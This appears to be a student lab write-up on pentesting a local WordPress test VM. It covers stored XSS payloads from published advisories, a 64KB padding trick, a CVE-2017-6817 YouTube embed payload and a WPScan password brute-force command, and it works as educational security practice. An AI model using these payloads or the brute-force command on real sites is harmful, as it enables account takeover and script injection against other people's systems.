<h1> Wordpress Pentesting </h1>

<h3> Time: approx 14 hours </h3>

<h3> 1. Stored XSS </h3>
Discovered by Jouko Pynnönen of Klikki Oy  <a href=url>https://klikki.fi/adv/wordpress2.html</a> This site was used as a resource. I injected the anchor tag below into the a post. 
      
   <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px [64 kilobytes of Letters]’> </a>

  You need 64 kilobytes of letters due to the MYSQL text size limit being 64KB so I made that with this python command. <br>
      <strong> python -c 'print ("A"*65600)' > payload.txt </strong> <br>
  In vim you can open up payload.txt and use ":%+" to copy the entire file and then paste it where the letters go in the anchor tag payload.
      This script will be triggered when the comment is viewed.
      ![Image Walkthrough](https://github.com/redbeard-sys/Codepath-week-7-and-8-kali/blob/main/XSS.gif)
 
   <h2> 2. Brute Force Login with WPScan and wordlist </h2>
      
      WPScan can ennumerate users and generate passwords if you use a wordlist.
      -use command: wpscan --url wpdistillery.vm -passwords passwords.txt
      -You can see on the left the admin section is open with the list of users
      -On the write you can see the result of the above command where the users are enumerated with their password.
      -I log in to user Franz using the results of the wpscan 
      
   ![Image](https://github.com/redbeard-sys/Codepath-week-7-and-8-kali/blob/main/password.gif)
     
      
      
  <h2> 3. Another Stored XSS </h3>
      <h4> versions before 4.2.3 are affected</h4>
     Also discovered by Jouko Pynnönen of Klikki Oy  <a href=url>https://klikki.fi/adv/wordpress3.html</a> 
      The following XSS attack requires a author or contributor level account.
      This could be made more malicious if a style tag is added to cover the whole page to force the execution of onmouseover
      The following code was inculcated into a post:
      
  ![Image](https://github.com/redbeard-sys/Codepath-week-7-and-8-kali/blob/main/linkXSS.gif)
      
       Wordpress processes this code into the following form
      
  ![Image](https://github.com/redbeard-sys/Codepath-week-7-and-8-kali/blob/main/storedXSS.gif)
      
  <h2> 4. Youtube stored XSS </h3>
      
      Resources below:  
     
   [suciri.net](https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html)  
      
                  CVE: 2017-6817
      
   [cvedetails.com](https://www.cvedetails.com/cve/CVE-2017-6817/)
      
      This is a core issue that was not resolved until 4.7.3
      
      the xce is an escape sequence to get around the shortcode_parse_atts function.
      
      Exploit: requires author or contributor level account.
      The following input:
      [embed src='https://www.youtube.com/embed/12345\x3csvg onload=alert("hacked")\x3e'][/embed]
      will be processed as
      <p>https://youtube.com/watch?v=12345<svg onload=alert("hacked")></p>

![image](https://github.com/redbeard-sys/Codepath-week-7-and-8-kali/blob/main/tubeHack.gif)



